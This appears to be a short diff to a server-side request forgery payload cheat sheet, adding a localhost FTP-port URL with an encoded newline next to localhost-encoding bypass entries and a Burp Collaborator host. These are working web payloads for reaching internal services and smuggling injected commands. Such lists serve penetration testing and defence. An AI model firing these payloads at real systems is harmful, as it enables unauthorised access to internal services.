@@ -25,6 +25,7 @@ _____________________________________
 http://127.1
 http://2130706433
 http://017700000001
+http://127.0.0.1:21/?%0A
 http://spoofed.burpcollaborator.net
 ```
 ### SSRF with whitelist-based input filters
